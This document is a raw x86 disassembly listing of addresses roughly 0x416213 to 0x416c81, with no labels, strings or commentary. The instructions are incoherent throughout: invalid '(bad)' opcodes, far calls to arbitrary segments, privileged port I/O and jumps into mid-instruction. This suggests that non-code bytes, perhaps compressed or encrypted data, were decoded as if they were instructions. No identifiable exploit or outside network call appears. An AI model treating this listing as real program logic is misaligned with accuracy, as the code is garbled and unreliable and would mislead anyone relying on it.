  416213:	and    al,0x81
  416215:	mov    edi,0x2862b5ae
  41621a:	xchg   BYTE PTR [ebp+0x55],dl
  41621d:	or     al,BYTE PTR [ecx+0x5f]
  416220:	ss dec ebp
  416222:	cmp    al,0x6c
  416224:	aas    
  416225:	mov    ebx,0x7b9fbcc6
  41622a:	mov    ebx,0x9cbe22ba
  41622f:	leave  
  416230:	and    BYTE PTR [ebx+eiz*4+0x157b5c94],dh
  416237:	sbb    ecx,esp
  416239:	mov    ch,BYTE PTR [ebx-0x22b42073]
  41623f:	and    bh,ah
  416241:	clc    
  416242:	shl    DWORD PTR [ecx],0x23
  416245:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416246:	ds jbe 0x41621a
  416249:	loopne 0x416248
  41624b:	imul   esi,esi,0xffffffa2
  41624e:	xor    BYTE PTR [ecx],ch
  416250:	pop    ebx
  416251:	inc    esp
  416252:	call   0x1a9f:0x6771a36
  416259:	push   es
  41625a:	ss stc 
  41625c:	out    dx,eax
  41625d:	mov    bh,BYTE PTR ds:0x9d5b0b3
  416263:	cwde   
  416264:	xchg   ecx,eax
  416266:	mov    ?,WORD PTR [edx+0x2b]
  416269:	shl    edi,0xa5
  41626c:	jmp    0x41620c
  41626e:	daa    
  41626f:	ret    0xb154
  416272:	packsswb mm0,QWORD PTR ds:0xa0c77172
  416279:	xor    ah,BYTE PTR [ebx+ebp*8+0x666bb659]
  416280:	test   bh,ah
  416282:	dec    esi
  416283:	jbe    0x4162ae
  416285:	jo     0x416233
  416287:	mov    ecx,0x309f9795
  41628c:	and    al,0x26
  41628e:	xchg   edx,eax
  41628f:	bound  ebp,QWORD PTR [ecx]
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x54ac:0x2b8852ee
  416305:	jmp    0x0:0x1050000
  41630c:	xchg   ecx,eax
  41630d:	icebp  
  41630e:	fsub   DWORD PTR [ebp+0x4b]
  416311:	addr16 push ss
  416313:	call   0xd453:0x861630b2
  41631a:	push   eax
  41631b:	xor    BYTE PTR [edx],bl
  41631d:	mov    dh,0xa5
  41631f:	pop    ebx
  416320:	add    DWORD PTR [edi],edi
  416322:	mov    WORD PTR [eax+0x52f6f87d],ds
  416328:	adc    eax,0xfa63e701
  41632d:	jbe    0x416363
  41632f:	push   es
  416330:	cs jbe 0x416321
  416333:	loop   0x41635e
  416335:	inc    ebp
  416336:	ins    BYTE PTR es:[edi],dx
  416337:	lahf   
  416338:	(bad)  
  416339:	arpl   di,si
  41633b:	dec    edi
  41633c:	xlat   BYTE PTR ds:[ebx]
  41633d:	adc    eax,0x63dc70f8
  416342:	jae    0x416386
  416344:	dec    edx
  416345:	lock cmp ah,BYTE PTR [edx+0x41]
  416349:	stos   DWORD PTR es:[edi],eax
  41634a:	mov    edx,fs
  41634c:	pop    ebx
  41634d:	adc    al,0xb6
  41634f:	in     eax,0xd8
  416351:	ret    0x6536
  416354:	das    
  416355:	and    DWORD PTR [esi-0x77bff09f],esp
  41635b:	lods   al,BYTE PTR ds:[esi]
  41635c:	neg    DWORD PTR [edx+0x7c705b5c]
  416362:	hlt    
  416363:	push   edx
  416364:	mov    al,ds:0xb29d0fa
  416369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41636a:	retf   0x302a
  41636d:	test   eax,0xca2cfeea
  416372:	fs mov ah,0xdd
  416375:	jne    0x416372
  416377:	sbb    al,0x5b
  416379:	(bad)  
  41637a:	ja     0x4163ab
  41637c:	xchg   ebx,eax
  41637d:	add    al,0xcb
  41637f:	jo     0x416379
  416381:	push   0xffffffc4
  416383:	mov    al,0xf
  416385:	ds xchg edx,eax
  416387:	sub    DWORD PTR [ebp+0x5f],esp
  41638a:	es popf 
  41638c:	jecxz  0x416331
  41638e:	cdq    
  41638f:	xchg   esi,eax
  416390:	(bad)  
  416391:	sbb    al,0x8b
  416393:	jns    0x41634d
  416395:	enter  0xb98,0x68
  416399:	sar    BYTE PTR [eax-0x58e866c6],0xc9
  4163a0:	loope  0x416391
  4163a2:	stos   DWORD PTR es:[edi],eax
  4163a3:	mov    ah,0xec
  4163a5:	xor    DWORD PTR [edi-0x47],ebp
  4163a8:	add    ecx,DWORD PTR [esi-0x2425c2a7]
  4163ae:	hlt    
  4163af:	pop    eax
  4163b0:	repnz mov dl,0xaa
  4163b3:	retf   
  4163b4:	int3   
  4163b5:	jbe    0x41633e
  4163b7:	xchg   esi,edi
  4163b9:	outs   dx,DWORD PTR ds:[si]
  4163bb:	jo     0x41635c
  4163bd:	ds sti 
  4163bf:	imul   ebx,edi,0x2c
  4163c2:	ins    BYTE PTR es:[edi],dx
  4163c3:	mov    ecx,0xda294a99
  4163c8:	push   eax
  4163c9:	add    ch,0xfa
  4163cc:	in     al,dx
  4163cd:	test   edi,esp
  4163cf:	fs fs mov bl,ah
  4163d3:	pop    ecx
  4163d4:	retf   0x413e
  4163d7:	push   esi
  4163d8:	int    0x7f
  4163da:	inc    esp
  4163db:	and    BYTE PTR [ebx+0x2d5356a],bl
  4163e1:	xor    dh,BYTE PTR [esi]
  4163e3:	(bad)  
  4163e4:	test   al,0xf9
  4163e6:	popa   
  4163e7:	or     BYTE PTR [ecx],cl
  4163e9:	aas    
  4163ea:	dec    ebp
  4163eb:	retf   
  4163ec:	inc    esp
  4163ed:	fidiv  WORD PTR [ebx-0x52f2c854]
  4163f3:	imul   ecx,DWORD PTR [esi],0xffffff8a
  4163f6:	add    bh,BYTE PTR ds:0xb71f4499
  4163fc:	lock push esi
  4163fe:	mov    gs,WORD PTR [esi+ebx*2]
  416401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416402:	test   eax,0x65716f31
  416407:	icebp  
  416408:	imul   eax,esi,0xb93c4b08
  41640e:	rcl    BYTE PTR [ebp-0x61],0x0
	...
  416472:	add    BYTE PTR [eax],al
  416474:	repz inc ebx
  416476:	ror    cl,1
  416478:	lock (bad) 
  41647b:	jnp    0x41640b
  41647d:	xor    al,0x5a
  41647f:	xchg   esi,eax
  416480:	cwde   
  416481:	jne    0x4164eb
  416483:	aam    0x59
  416485:	jmp    0x416487
  416487:	add    BYTE PTR ds:0x37000001,al
  41648d:	jns    0x416487
  41648f:	popf   
  416490:	outs   dx,BYTE PTR ds:[esi]
  416491:	sub    al,0xe1
  416493:	push   ds
  416494:	mov    esp,0x7fb90f6e
  416499:	mov    eax,ds:0xa83b27b3
  41649e:	enter  0xbe28,0x21
  4164a2:	int3   
  4164a3:	hlt    
  4164a4:	data16 fdiv QWORD PTR [ebx]
  4164a7:	and    eax,0x81156c32
  4164ac:	dec    ecx
  4164ad:	leave  
  4164ae:	add    DWORD PTR [edi-0x74],ebx
  4164b1:	arpl   WORD PTR [esp+ebp*4+0x29],di
  4164b5:	add    DWORD PTR [ecx-0x23311914],0x9f1cf73f
  4164bf:	pushf  
  4164c0:	pop    eax
  4164c1:	mov    ecx,0x3c43ac8a
  4164c6:	mov    bh,0xdd
  4164c8:	mov    eax,ds:0x29902c5d
  4164cd:	xchg   ebp,eax
  4164ce:	shr    DWORD PTR [eax+esi*4],1
  4164d1:	cld    
  4164d2:	pop    edi
  4164d3:	jne    0x416547
  4164d5:	jo     0x4164a2
  4164d7:	mov    ch,ch
  4164d9:	or     esi,DWORD PTR [ebp+0x1f628938]
  4164df:	clc    
  4164e0:	dec    eax
  4164e1:	push   ss
  4164e2:	dec    ecx
  4164e3:	and    al,0x76
  4164e5:	popf   
  4164e6:	stc    
  4164e7:	or     al,0x1c
  4164e9:	jl     0x41649d
  4164eb:	scas   al,BYTE PTR es:[edi]
  4164ec:	adc    dl,dl
  4164ee:	pop    ss
  4164ef:	les    esi,FWORD PTR [eax]
  4164f1:	stc    
  4164f2:	jo     0x416522
  4164f4:	and    bl,BYTE PTR [edx+0x7c]
  4164f7:	js     0x41656c
  4164f9:	rcr    BYTE PTR [edi],cl
  4164fb:	ret    
  4164fc:	xchg   ebx,eax
  4164fd:	dec    ebx
  4164fe:	mov    bh,0x8d
  416500:	push   cs
  416501:	jmp    0x617:0xd5e647f7
  416508:	mov    al,ds:0x240ede40
  41650d:	aam    0x10
  41650f:	call   0xa5b0:0xcb43c654
  416516:	test   BYTE PTR [ebx-0x3471db10],dl
  41651c:	clc    
  41651d:	mov    ch,0x80
  41651f:	les    edi,FWORD PTR [esi]
  416521:	push   cs
  416522:	jg     0x4164b0
  416524:	pop    esi
  416525:	push   ebx
  416526:	or     dl,BYTE PTR [esi-0x78252754]
  41652c:	pop    ebx
  41652d:	retf   0x2b70
  416530:	mov    ds:0xf445beb0,al
  416535:	jae    0x41659b
  416537:	adc    edi,DWORD PTR es:[ebx+0x7a1ce3ba]
  41653e:	mov    dh,0xab
  416540:	mov    edx,DWORD PTR [edx-0x5f]
  416543:	dec    edi
  416544:	xlat   BYTE PTR ds:[ebx]
  416545:	fdiv   QWORD PTR [ebx-0x5f2e7e6e]
  41654b:	pop    ebx
  41654c:	scas   al,BYTE PTR es:[edi]
  41654d:	pop    eax
  41654e:	cmp    bl,BYTE PTR [edi+0x46796a51]
  416554:	dec    ecx
  416555:	in     eax,0xee
  416557:	jmp    0x72a8:0x6df0514d
  41655e:	add    eax,0x2870012f
  416563:	sub    al,0xd9
  416565:	xor    BYTE PTR ds:0xeaec60bd,bh
  41656b:	retf   
  41656c:	xchg   edi,eax
  41656d:	pop    es
  41656e:	cld    
  41656f:	shr    DWORD PTR [edi+0x6c117db0],cl
  416575:	loop   0x416591
  416577:	adc    DWORD PTR [ecx+0x2e],ebx
  41657a:	pop    edi
  41657b:	shl    dh,1
  41657d:	lods   eax,DWORD PTR ds:[esi]
  41657e:	push   0x46
  416580:	aaa    
  416581:	ins    BYTE PTR es:[edi],dx
  416582:	pop    ebp
  416583:	sub    BYTE PTR [ecx-0x11],ah
  416586:	dec    ecx
  416587:	adc    al,0xc3
  416589:	loopne 0x416603
  41658b:	pop    ebp
  41658c:	dec    ebp
  41658d:	mov    ss:0x322,al
	...
  4165f3:	add    BYTE PTR ds:0xfff32bd8,ah
  4165f9:	repz std 
  4165fb:	fisub  WORD PTR [esi-0x2eb04354]
  416601:	mov    bl,BYTE PTR [eax+0xec5e94]
  416607:	add    BYTE PTR ds:0xb5000001,al
  41660d:	xchg   edx,eax
  41660e:	xchg   esi,eax
  41660f:	(bad)  
  416610:	xchg   esi,eax
  416611:	pop    ecx
  416612:	or     BYTE PTR [ebp+0x32],bh
  416615:	jg     0x41663b
  416617:	cmp    bl,BYTE PTR [eax+0x5273ee2b]
  41661d:	dec    ebx
  41661e:	sbb    WORD PTR [eax-0x60],0xd2dd
  416624:	xor    eax,0x660ce781
  416629:	call   0xc9a687ff
  41662e:	xchg   esi,eax
  41662f:	pop    ss
  416630:	mov    edx,0x2a3e0f1e
  416635:	push   ecx
  416636:	jns    0x4165ec
  416638:	pop    ebx
  416639:	and    DWORD PTR [ebx],ecx
  41663b:	clc    
  41663c:	mov    bh,BYTE PTR [edx+ebp*4]
  41663f:	repz inc edi
  416641:	inc    edi
  416642:	add    al,BYTE PTR [esi+edx*1-0x2a6ecc50]
  416649:	inc    edx
  41664a:	pop    edi
  41664b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41664c:	cwde   
  41664d:	xchg   DWORD PTR [edi-0x59],edx
  416650:	mov    ebp,0x8ad0e8eb
  416655:	loope  0x41665b
  416657:	dec    esi
  416658:	sbb    DWORD PTR [ebx],esp
  41665a:	ror    DWORD PTR [edi+0x3ff34d9],0xbd
  416661:	or     ah,ah
  416663:	enter  0x4b29,0x9c
  416667:	cmp    DWORD PTR [edi-0x3d],ebp
  41666a:	mov    eax,ds:0x98585ffe
  41666f:	adc    DWORD PTR [eax-0x2bc514ac],esi
  416675:	lods   al,BYTE PTR ds:[esi]
  416676:	icebp  
  416677:	xchg   esi,eax
  416678:	mov    bh,0xdc
  41667a:	jo     0x4166ee
  41667c:	xchg   ebx,eax
  41667d:	pop    es
  41667e:	outs   dx,BYTE PTR ds:[esi]
  41667f:	je     0x4166f2
  416681:	pop    ds
  416682:	sbb    DWORD PTR [edx],0x613a57d2
  416688:	sub    eax,0xbcb99758
  41668d:	ja     0x41667d
  41668f:	retf   0xec68
  416692:	xor    al,0xbf
  416694:	xor    esp,eax
  416696:	mov    WORD PTR [esi-0x50c364e5],ss
  41669c:	mov    bh,0xf6
  41669e:	pop    es
  41669f:	pop    esi
  4166a0:	pushf  
  4166a1:	std    
  4166a2:	ins    BYTE PTR es:[edi],dx
  4166a3:	inc    ecx
  4166a4:	popf   
  4166a5:	sub    bh,BYTE PTR [eax-0x52]
  4166a8:	push   ss
  4166a9:	inc    ebp
  4166aa:	jl     0x4166cc
  4166ac:	popf   
  4166ad:	(bad)  
  4166ae:	adc    bh,BYTE PTR [edx]
  4166b0:	mov    WORD PTR [ebx+0x27],?
  4166b3:	mov    dl,0xf5
  4166b5:	jp     0x41663e
  4166b7:	outs   dx,BYTE PTR ds:[esi]
  4166b8:	mov    eax,0x5242a226
  4166bd:	and    BYTE PTR [esi-0x1c089558],dl
  4166c3:	inc    ebp
  4166c4:	xchg   esp,eax
  4166c5:	icebp  
  4166c6:	imul   ecx,ebx,0x3d
  4166c9:	pop    es
  4166ca:	lea    ebp,ds:0xcb554aa2
  4166d0:	adc    ecx,DWORD PTR [ebx+0x52]
  4166d3:	and    cl,0xd2
  4166d6:	pop    ecx
  4166d7:	mov    eax,ds:0xa0af8060
  4166dc:	mov    esi,0x42349ab8
  4166e1:	push   cs
  4166e2:	cmp    edx,edi
  4166e4:	and    al,0x89
  4166e6:	in     eax,dx
  4166e7:	mov    dh,0x58
  4166e9:	jae    0x4166ec
  4166eb:	xor    eax,0x75c282d
  4166f0:	mov    ds:0x2bfc725d,al
  4166f5:	push   0x7147d3cf
  4166fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166fb:	inc    edx
  4166fc:	dec    ebp
  4166fd:	scas   al,BYTE PTR es:[edi]
  4166fe:	es jns 0x416684
  416701:	cdq    
  416702:	loopne 0x416749
  416704:	jg     0x4166da
  416706:	push   0xffffff87
  416708:	mov    eax,0x8519c6e5
  41670d:	arpl   WORD PTR [ebx+0xc242],sp
	...
  416773:	add    ah,al
  416775:	(bad)  
  416777:	(bad)  
  416778:	(bad)  
  41677a:	out    0xff,eax
  41677c:	sbb    edi,DWORD PTR [esp+ecx*2-0x3a]
  416780:	cmc    
  416781:	sub    BYTE PTR [eax+0xed6314],al
  416787:	add    BYTE PTR ds:0x57000001,al
  41678d:	dec    edi
  41678e:	inc    ecx
  41678f:	adc    eax,0x18ef3b65
  416794:	out    dx,eax
  416795:	jne    0x41674d
  416797:	retf   
  416798:	out    dx,eax
  416799:	js     0x41671e
  41679b:	or     DWORD PTR [edi],edi
  41679d:	out    0x36,eax
  41679f:	jae    0x4167ef
  4167a1:	mov    BYTE PTR [ebx+0xcfcf8fe],bh
  4167a7:	pop    ebp
  4167a8:	in     al,0xf5
  4167aa:	push   edx
  4167ab:	ja     0x416808
  4167ad:	and    ah,BYTE PTR [edx+ebp*1-0x6a]
  4167b1:	into   
  4167b2:	repnz sbb al,dh
  4167b5:	jge    0x41677c
  4167b7:	mov    bl,0x3d
  4167b9:	push   ebx
  4167ba:	inc    eax
  4167bb:	sbb    al,0x99
  4167bd:	jmp    DWORD PTR [ebx]
  4167bf:	mul    DWORD PTR [ebp-0x127b10b0]
  4167c5:	gs mov bl,dh
  4167c8:	jge    0x416755
  4167ca:	push   cs
  4167cb:	lods   al,BYTE PTR ds:[esi]
  4167cc:	lods   eax,DWORD PTR ds:[esi]
  4167cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167ce:	add    al,0x22
  4167d0:	jnp    0x416817
  4167d2:	fs mov bh,0xfa
  4167d5:	pop    ebp
  4167d6:	add    bh,BYTE PTR ds:[edi+0x4d8547fa]
  4167dd:	and    al,0xb3
  4167df:	int    0x3b
  4167e1:	or     al,0x12
  4167e3:	inc    ecx
  4167e4:	xchg   ecx,eax
  4167e5:	fldz   
  4167e7:	test   al,0x36
  4167e9:	repz adc ebp,DWORD PTR [ecx+0x304db6bc]
  4167f0:	inc    esi
  4167f1:	pop    eax
  4167f2:	jo     0x416784
  4167f4:	inc    eax
  4167f5:	sub    ebp,DWORD PTR [ebp+0x13]
  4167f8:	das    
  4167f9:	(bad)  [eax-0x4a8a5912]
  4167ff:	call   0x654e:0x8e1302db
  416806:	mov    WORD PTR [ecx+0x7b],?
  416809:	clc    
  41680a:	fcomp  QWORD PTR [edi-0x4a]
  41680d:	add    ch,0xcc
  416810:	mov    ecx,0x9f9d961c
  416815:	mov    ebp,0xc58ea2c5
  41681a:	jl     0x4167f5
  41681c:	lods   eax,DWORD PTR ds:[esi]
  41681d:	jns    0x4167b1
  41681f:	repz arpl WORD PTR ds:[edx+0x11],sp
  416824:	push   es
  416825:	push   cs
  416826:	shr    BYTE PTR [edi],0x3d
  416829:	gs jno 0x4167dd
  41682c:	xchg   ecx,eax
  41682d:	jg     0x416850
  41682f:	pop    edi
  416830:	push   ebx
  416831:	aad    0xab
  416833:	dec    edx
  416834:	xchg   cl,ch
  416836:	pop    esp
  416837:	push   edx
  416838:	mov    eax,ds:0x5d54391c
  41683d:	and    BYTE PTR [ebx+0x26163153],0x80
  416844:	fist   WORD PTR [esi+esi*1]
  416847:	jl     0x416859
  416849:	shr    dl,0xc0
  41684c:	gs pop ebp
  41684e:	das    
  41684f:	mov    bl,BYTE PTR [ebp-0x18fc2f6e]
  416855:	push   esp
  416856:	xor    al,0x52
  416858:	xor    BYTE PTR [ecx+0x5860dcc6],dh
  41685e:	imul   edi,DWORD PTR [edx],0x2e4734cf
  416864:	mov    ?,WORD PTR [ebx+ecx*8]
  416867:	iret   
  416868:	or     BYTE PTR [ebx],ch
  41686a:	div    BYTE PTR [edx-0x21]
  41686d:	pop    ebp
  41686e:	cs fs in eax,0x1a
  416872:	div    BYTE PTR [eax-0x4d77e2b4]
  416878:	cdq    
  416879:	dec    ecx
  41687a:	sbb    BYTE PTR [ebx+0x3f2bf690],ah
  416880:	cmp    BYTE PTR ds:[esp+eiz*4],ah
  416884:	stos   BYTE PTR es:[edi],al
  416885:	leave  
  416886:	and    ecx,eax
  416888:	retf   0xa4fe
  41688b:	and    BYTE PTR [edi+0x5dfafb0a],al
	...
  4168f1:	add    BYTE PTR [eax],al
  4168f3:	add    cl,dl
  4168f5:	scas   eax,DWORD PTR es:[edi]
  4168f6:	push   es
  4168f7:	repz jle 0x4168f5
  4168fa:	cmc    
  4168fb:	scas   eax,DWORD PTR es:[edi]
  4168fc:	sub    DWORD PTR [edi-0x5d],edi
  4168ff:	mov    ebp,0x4f512d8f
  416904:	push   0x50000ee
  416909:	add    DWORD PTR [eax],eax
  41690b:	add    BYTE PTR [ecx+eax*1-0x756ec481],bl
  416912:	fwait
  416913:	mov    ds:0x7f034122,al
  416918:	push   0x4d
  41691a:	and    edi,esi
  41691c:	stos   DWORD PTR es:[edi],eax
  41691d:	pop    esp
  41691e:	imul   edx,DWORD PTR [ebp+0x23],0x4b
  416922:	xchg   DWORD PTR [edi+edx*8],ebp
  416925:	mov    al,ds:0x66c5a5e7
  41692a:	and    DWORD PTR [ecx-0xf],0x33826020
  416931:	adc    eax,0xbaaf4778
  416936:	mov    WORD PTR ds:0x7cd8ffb,cs
  41693c:	xchg   edx,eax
  41693d:	jmp    0x4169ad
  41693f:	push   cs
  416940:	jnp    0x4169a0
  416942:	mov    edx,0x295a9230
  416947:	cmp    BYTE PTR [ecx+0x27894bb0],dl
  41694d:	adc    ecx,ebx
  41694f:	jb     0x4168dd
  416951:	sub    DWORD PTR [edx],eax
  416953:	xchg   ebx,eax
  416954:	out    dx,al
  416955:	in     al,0xb4
  416957:	jp     0x4168ee
  416959:	in     al,dx
  41695a:	fidiv  WORD PTR [esi+0x3b]
  41695d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41695e:	push   ecx
  41695f:	je     0x41698d
  416961:	push   ecx
  416962:	js     0x416921
  416964:	push   edx
  416965:	sub    al,0x40
  416967:	daa    
  416968:	jne    0x416951
  41696a:	popf   
  41696b:	mov    edi,0x91f842c5
  416970:	dec    edx
  416971:	sub    al,0x36
  416973:	fld    DWORD PTR [esi]
  416975:	std    
  416976:	or     BYTE PTR [eax],0x4c
  416979:	mov    ds:0x9723b19f,al
  41697e:	mov    edx,0x3071fa5c
  416983:	mov    ch,0x53
  416985:	mov    ch,0x62
  416987:	je     0x4169ef
  416989:	pop    esp
  41698a:	test   BYTE PTR [esi],cl
  41698c:	ja     0x416975
  41698e:	xor    BYTE PTR [ebx],dl
  416990:	pusha  
  416991:	cmp    al,ch
  416993:	pop    esp
  416994:	repnz (bad) 
  416996:	or     ecx,eax
  416998:	inc    ebp
  416999:	adc    edi,DWORD PTR [ecx]
  41699b:	mov    BYTE PTR [esi],0x20
  41699e:	ret    0x6aa7
  4169a1:	push   es
  4169a2:	inc    eax
  4169a3:	(bad)  
  4169a4:	call   0x5b0abff0
  4169a9:	mov    bl,0xe6
  4169ab:	or     dl,BYTE PTR [ebx+0x157bab82]
  4169b1:	sbb    esi,DWORD PTR [eax]
  4169b3:	cmp    bl,BYTE PTR [eax]
  4169b5:	test   al,0xc1
  4169b7:	dec    ecx
  4169b8:	out    0x61,al
  4169ba:	mov    DWORD PTR [edx-0x10],0xcd6a0d8c
  4169c1:	jnp    0x4169bb
  4169c3:	and    al,0x68
  4169c5:	sub    DWORD PTR [ecx+0x4f],ecx
  4169c8:	xchg   esp,eax
  4169c9:	inc    edx
  4169ca:	sbb    ecx,edi
  4169cc:	mov    ch,0xba
  4169ce:	and    esi,esi
  4169d0:	retf   
  4169d1:	(bad)  [ecx+0xd]
  4169d4:	pop    ebx
  4169d5:	stos   DWORD PTR es:[edi],eax
  4169d6:	cmp    BYTE PTR [edx-0x68],cl
  4169d9:	push   esi
  4169da:	sbb    DWORD PTR [ebx+0x309a57f5],eax
  4169e0:	je     0x4169ea
  4169e2:	pop    ebp
  4169e3:	mov    BYTE PTR [eax-0x6193b0b8],bh
  4169e9:	push   edi
  4169ea:	mov    ebp,0x39566c85
  4169ef:	adc    ebp,DWORD PTR [esi]
  4169f1:	xor    eax,0xe9cde8d4
  4169f6:	dec    ebx
  4169f7:	pop    esi
  4169f8:	fist   DWORD PTR [eax+0xe]
  4169fb:	fidivr WORD PTR [eiz*2+0x79fcc849]
  416a02:	int    0xe2
  416a04:	sbb    eax,0x31f30ce8
  416a09:	test   eax,0x142f2b41
  416a0e:	inc    esi
  416a0f:	cmp    al,BYTE PTR [ebp+0x0]
	...
  416a71:	add    BYTE PTR [eax],al
  416a73:	add    bl,cl
  416a75:	pusha  
  416a76:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7d:	mov    al,ds:0x59c80ba3
  416a82:	in     eax,0x37
  416a84:	ins    DWORD PTR es:[edi],dx
  416a85:	out    dx,eax
  416a86:	add    BYTE PTR [eax],al
  416a88:	add    eax,0x35000001
  416a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a8e:	rol    BYTE PTR [edx],0xdb
  416a91:	in     al,dx
  416a92:	push   cs
  416a93:	mov    ecx,?
  416a95:	ss retf 
  416a97:	sub    BYTE PTR [ebp-0xfa58cad],bh
  416a9d:	into   
  416a9e:	test   al,0xdf
  416aa0:	and    al,0x24
  416aa2:	mov    ds,WORD PTR [esi]
  416aa4:	js     0x416a5e
  416aa6:	sbb    al,0x2d
  416aa8:	test   eax,0x31789b6c
  416aad:	fcomp  st(6)
  416aaf:	xor    cl,BYTE PTR [eax-0x17]
  416ab2:	or     edx,DWORD PTR [edx-0x6e]
  416ab5:	jno    0x416aed
  416ab7:	mov    bh,0x7d
  416ab9:	mov    ch,0xd4
  416abb:	inc    eax
  416abc:	and    bl,BYTE PTR [edx+0x73]
  416abf:	push   ecx
  416ac0:	jne    0x416a5a
  416ac2:	mov    WORD PTR [esi+esi*1],cs
  416ac5:	adc    BYTE PTR [eax-0x3898786e],bl
  416acb:	(bad)  [ecx+0x6d]
  416ace:	rol    DWORD PTR [ecx-0x7b],0xb6
  416ad2:	mov    ds:0x45c408c,al
  416ad7:	xor    bh,0xc4
  416ada:	dec    eax
  416adb:	test   BYTE PTR [esi-0x2d],0xb8
  416adf:	or     al,0xa
  416ae1:	pop    ecx
  416ae2:	shl    DWORD PTR [eax],1
  416ae4:	push   es
  416ae5:	rcr    BYTE PTR [eax+0x7d],cl
  416ae8:	fwait
  416ae9:	xlat   BYTE PTR ds:[ebx]
  416aea:	jecxz  0x416b43
  416aec:	scas   al,BYTE PTR es:[edi]
  416aed:	test   eax,0x18a67188
  416af2:	retf   
  416af3:	in     eax,dx
  416af4:	cmp    BYTE PTR ds:0x2ee53c16,cl
  416afa:	arpl   WORD PTR [eax-0x28],dx
  416afd:	jge    0x416b79
  416aff:	nop
  416b00:	xchg   DWORD PTR [ecx],ebx
  416b02:	xor    dl,ah
  416b04:	pop    esi
  416b05:	mov    esp,DWORD PTR [edx]
  416b07:	aaa    
  416b08:	jmp    0xa6decbc9
  416b0d:	sub    eax,0x9ff5df73
  416b12:	add    BYTE PTR [ebx],ch
  416b14:	cmp    DWORD PTR [edx-0x7],edx
  416b17:	jne    0x416acc
  416b19:	xchg   DWORD PTR [edx],ebx
  416b1b:	and    DWORD PTR [ebx-0x5],ebp
  416b1e:	das    
  416b1f:	addr16 ja 0x416b94
  416b22:	inc    edi
  416b23:	(bad)  
  416b25:	dec    edi
  416b26:	sbb    dl,BYTE PTR [ebp+0x6749423f]
  416b2c:	mov    ds,ebp
  416b2e:	sar    BYTE PTR [ecx+0x466aa5ac],0xb2
  416b35:	pusha  
  416b36:	dec    esi
  416b37:	fs cs loope 0x416ac3
  416b3b:	push   esp
  416b3c:	and    bl,BYTE PTR [edi]
  416b3e:	sti    
  416b3f:	push   ebx
  416b40:	mov    bh,0x89
  416b42:	jnp    0x416b9e
  416b44:	dec    ebx
  416b45:	clc    
  416b46:	sbb    BYTE PTR [eax+0x16ae4d06],bl
  416b4c:	aaa    
  416b4d:	repnz fnsave [eax+0x3e]
  416b51:	or     DWORD PTR ds:0x64ac9a85,eax
  416b57:	and    DWORD PTR [edx+0x6be7f9c],ecx
  416b5d:	push   ds
  416b5e:	mov    esp,DWORD PTR [eax-0x46]
  416b61:	popa   
  416b62:	js     0x416bd8
  416b64:	imul   esp,edi,0xffffff9b
  416b67:	push   ebp
  416b68:	les    ebp,FWORD PTR [esi+0x9]
  416b6b:	rcl    DWORD PTR [edi],cl
  416b6d:	cmp    al,0x2b
  416b6f:	popf   
  416b70:	scas   eax,DWORD PTR es:[edi]
  416b71:	dec    ebp
  416b72:	ret    0x2a3b
  416b75:	sub    eax,0xdcd5499f
  416b7a:	sub    esi,DWORD PTR [esi]
  416b7c:	push   esp
  416b7d:	loopne 0x416baa
  416b7f:	jmp    0xdaff:0xaddc1bf5
  416b86:	push   es
  416b87:	cmp    dh,BYTE PTR [edx+0x64a1eb8d]
  416b8d:	adc    esp,DWORD PTR [ecx+0xf842]
	...
  416bf3:	add    bl,ah
  416bf5:	gs push cs
  416bf7:	test   DWORD PTR [esi-0x38a0401],0x4c5b70a9
  416c01:	mov    edx,eax
  416c03:	xor    DWORD PTR [edx-0x10],esi
  416c06:	add    BYTE PTR [eax],al
  416c08:	add    eax,0xcf000001
  416c0d:	xor    ecx,DWORD PTR [ecx+0x75]
  416c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c11:	mov    bh,0xd3
  416c13:	xor    eax,0x40f58afd
  416c18:	nop
  416c19:	test   eax,0xae9e55d7
  416c1e:	push   ebp
  416c1f:	scas   eax,DWORD PTR es:[edi]
  416c20:	retf   
  416c21:	aaa    
  416c22:	hlt    
  416c23:	loopne 0x416be7
  416c25:	cs cmp dh,cl
  416c28:	inc    ebx
  416c29:	inc    eax
  416c2a:	sbb    al,0x63
  416c2c:	mov    eax,ds:0xc6eb2603
  416c31:	iret   
  416c32:	ret    0x5c0d
  416c35:	(bad)  
  416c36:	and    ch,BYTE PTR [ecx-0x67]
  416c39:	stos   BYTE PTR es:[edi],al
  416c3a:	sbb    dh,al
  416c3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c3d:	repz fisub DWORD PTR [edx]
  416c40:	aad    0xbd
  416c42:	enter  0xca2c,0xb9
  416c46:	pop    eax
  416c47:	jns    0x416c29
  416c49:	push   ebx
  416c4a:	sar    DWORD PTR [edx-0x7b],0x30
  416c4e:	test   BYTE PTR [edi],0x5f
  416c51:	jle    0x416bde
  416c53:	fidiv  WORD PTR [edx+ebx*4]
  416c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c57:	out    0xf2,eax
  416c59:	repnz add eax,0x524a0cb4
  416c5f:	icebp  
  416c60:	out    dx,eax
  416c61:	lock call 0xbe75d070
  416c67:	out    0xe1,al
  416c69:	ins    BYTE PTR es:[edi],dx
  416c6a:	popf   
  416c6b:	add    esp,DWORD PTR [eax]
  416c6d:	es jmp 0x416cd8
  416c70:	xchg   ebp,eax
  416c71:	pushf  
  416c72:	cmp    eax,0x6fada5b6
  416c77:	mov    al,0xf9
  416c79:	mov    ch,0x8d
  416c7b:	cld    
  416c7c:	xchg   edi,eax
  416c7d:	dec    ebx
  416c7e:	pop    esi
  416c7f:	addr16 pop ds
  416c81:	xchg   ebp,eax
